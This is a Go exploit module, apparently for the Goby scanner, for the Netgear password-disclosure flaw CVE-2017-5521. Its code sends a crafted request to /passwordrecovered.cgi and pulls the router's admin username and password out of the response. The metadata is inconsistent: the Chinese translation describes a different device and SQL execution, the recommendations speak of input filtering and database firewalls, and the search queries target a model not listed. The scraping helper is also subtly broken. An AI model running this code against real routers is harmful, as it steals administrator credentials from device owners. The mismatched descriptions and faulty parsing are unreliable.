package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Netgear Remote and Local Password Disclosure (CVE-2017-5521)",
    "Description": "An issue was discovered on NETGEAR R8500, R8300, R7000, R6400, R7300, R7100LG, R6300v2, WNDR3400v3, WNR3500Lv2, R6250, R6700, R6900, and R8000 devices. They are prone to password disclosure via simple crafted requests to the web management server. The bug is exploitable remotely if the remote management option is set, and can also be exploited given access to the router over LAN or WLAN. When trying to access the web panel, a user is asked to authenticate; if the authentication is canceled and password recovery is not enabled, the user is redirected to a page that exposes a password recovery token. If a user supplies the correct token to the page /passwordrecovered.cgi?id=TOKEN (and password recovery is not enabled), they will receive the admin password for the router. If password recovery is set the exploit will fail, as it will ask the user for the recovery questions that were previously set when enabling that feature. This is persistent (even after disabling the recovery option, the exploit will fail) because the router will ask for the security questions.",
    "Impact": "Netgear Remote and Local Password Disclosure (CVE-2017-5521)",
    "Recommendation": "<p>1. The data entered by the user needs to be strictly filtered in the webpage code. </p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. Upgrade to the latest version. </p>",
    "Product": "Multi Netgear Product",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "NETGEAR-DGN2200敏感文件泄漏",
            "Description": "NETGEAR-DGN2200敏感文件泄漏",
            "Impact": "<p>黑客可以直接执行SQL语句，从而控制整个服务器：获取数据、修改数据、删除数据等。</p>",
            "Recommendation": "<p>1.在网页代码中需要对用户输入的数据进行严格过滤。</p><p>2.部署Web应用防火墙，对数据库操作进行监控。</p><p>3.升级至最新版本。</p>",
            "Product": "NETGEAR-DGN2200",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Netgear Remote and Local Password Disclosure (CVE-2017-5521)",
            "Description": "An issue was discovered on NETGEAR R8500, R8300, R7000, R6400, R7300, R7100LG, R6300v2, WNDR3400v3, WNR3500Lv2, R6250, R6700, R6900, and R8000 devices. They are prone to password disclosure via simple crafted requests to the web management server. The bug is exploitable remotely if the remote management option is set, and can also be exploited given access to the router over LAN or WLAN. When trying to access the web panel, a user is asked to authenticate; if the authentication is canceled and password recovery is not enabled, the user is redirected to a page that exposes a password recovery token. If a user supplies the correct token to the page /passwordrecovered.cgi?id=TOKEN (and password recovery is not enabled), they will receive the admin password for the router. If password recovery is set the exploit will fail, as it will ask the user for the recovery questions that were previously set when enabling that feature. This is persistent (even after disabling the recovery option, the exploit will fail) because the router will ask for the security questions.",
            "Impact": "Netgear Remote and Local Password Disclosure (CVE-2017-5521)",
            "Recommendation": "<p>1. The data entered by the user needs to be strictly filtered in the webpage code. </p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. Upgrade to the latest version. </p>",
            "Product": "Multi Netgear Product",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(header=\"realm=\\\"NETGEAR DGN2200\" || title=\"NETGEAR Router DGN2200\" || banner=\"NETGEAR DGN2200\")",
    "GobyQuery": "(header=\"realm=\\\"NETGEAR DGN2200\" || title=\"NETGEAR Router DGN2200\" || banner=\"NETGEAR DGN2200\")",
    "Author": "ovi3",
    "Homepage": "https://www.netgear.com/",
    "DisclosureDate": "2017-01-30",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5521",
        "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18758",
        "http://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability",
        "https://www.cnblogs.com/xiaoxiaoleo/p/6360260.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.1",
    "CVEIDs": [
        "CVE-2017-5521"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201701-454"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	scrape := func(text string, startTrig string, endTrig string) string {
		if strings.Contains(text, startTrig) {
			tmp := strings.SplitN(text, startTrig, 1)
			return strings.SplitN(tmp[len(tmp)-1], endTrig, 1)[0]
		} else {
			return "i_dont_speak_english"
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/passwordrecovered.cgi?id=get_rekt")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && regexp.MustCompile(`right">Router\s*Admin\s*Username<`).MatchString(resp.RawBody) &&
					regexp.MustCompile(`right">Router\s*Admin\s*Password<`).MatchString(resp.RawBody) &&
					strings.Contains(resp.RawBody, "left") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/passwordrecovered.cgi?id=get_rekt")
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.RawBody, `left">"`) {
					username := scrape(resp.RawBody, "Router Admin Username</td>", "</td>")
					username = scrape(username, ">", "'")
					password := scrape(resp.RawBody, "Router Admin Password</td>", "</td>")
					password = scrape(password, ">", "'")
					if username == "i_dont_speak_english" {
						username = scrape(resp.RawBody[strings.Index(resp.RawBody, `left">`):], `left">`, "</td>")
						password = scrape(resp.RawBody[strings.LastIndex(resp.RawBody, `left">`):], `left">`, "</td>")
					}
					expResult.Success = true
					expResult.Output = username + " : " + password
				}
			}
			return expResult
		},
	))
}
